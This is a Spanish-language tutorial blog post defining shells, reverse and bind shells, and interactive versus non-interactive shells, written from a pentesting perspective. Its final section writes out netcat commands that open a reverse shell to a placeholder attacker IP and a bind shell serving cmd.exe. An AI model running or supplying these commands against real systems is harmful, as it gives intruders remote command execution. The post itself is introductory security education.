---
layout: post
title:  "Tipos de Shell: Reverse,Bind, y como pueden ser según su interactividad"
description: En este post aprenderemos la definición de una shell, sus tipos (reverse,bind) y como pueden ser estas en función de como interactuan con nosotros.

tags: shell,reverse
---


# ¿Qué es una shell?

Cuando la mayoría de la gente ve esto, y ve que interactuamos con ello, nos tachan de hackers u otras cosas parecidas, pero nada más lejos de la realidad. La shell, que en terminos técnicos es "un interprete de comandos" nos permite interactuar con el sistema.


Al igual que con el teclado y ratón, si nos esforzamos un poquito en entender y aprender a usar la terminal, seremos muchísimos más productivo y eficientes, y entenderemos mejor como funciona todo, además de tener muchísimas más posibilidades.

Ahora bien, en este post estamos tratando las shell desde el punto de visto de conseguir acceso a máquina víctimas, por tanto hay que tener esto en cuenta: Cuando se dice "he consigo una shell" suele referirse a que tenemos ejecucción de comandos en la máquina víctima, aunque sea en un contexto de usuario no privilegiado.



# Tipos de Shell

* Reverse Shell: La máquina es forzada a ejecutar código que conecta con nuestro ordenador. Es decir, cuando nosotros como ATACANTES nos ponemos a la escucha con, por ejemplo NETCAT...y logramos que la máquina ejecute cierto comando, recibiremos una  `REVERSE SHELL`...
* Bind Shell: El código ejecutado en la máquina víctima se usa para ejecutar un listener que apunta directamente a la shell víctima.
Esto, al ser extremedamente peligroso, suele estar bloqueado por el firewall.

`Ejemplo de ponernos a la escucha (reverse shell) en el puerto 1234 con nc(netcat).`
<a href="https://imgbb.com/"><img src="https://i.ibb.co/kg3PnWM/nc.png" alt="nc" border="0" /></a>


# Cuando conseguimos una shell ¿Cómo puede ser?

Interactica o no interactiva:

* Interactiva: Como su nombre indica, podemos interactuar con ella de manera interactiva. Por ejemplo, al hacer una conexión SSH, cuando nos pregunta si estamos seguro de que si queremos seguir adelante, lo veremos y podremos contestar.
* No interactiva: Al contrario que en las interactivas, no veremos ni podremos contestar a mensajes por consola. Solo podremos ejecutar comandos y ver su salida simple.


# Ejemplos de uso para entender las definiciones mejor:

`Reverse Shell`

Máquina atacante (nosotros): Nos ponemos a la escucha con netcat en el puerto 1234:
```sh
nc -lvnp 1234
```

Máquina víctima: Nos manda una shell (ejemplo Linux)
```bash
nc ip_atacante 443 -e /bin/bash
```


Esto sería lo que tendríamos que conseguir en la máquina víctima de una forma u otra, ya sea subiendo fichero, con ejecución remota de comandos, o de mil maneras que se nos podrían ocurrir.

`Bind Shell`

Máquina víctima: La ponemos a a la escucha (ejemplo Windows)
```bash
nc -lvnp 443 -e "cmd.exe"
```
Máquina atacante (nosotros):
```bash
nc ip_víctima 443
```

 



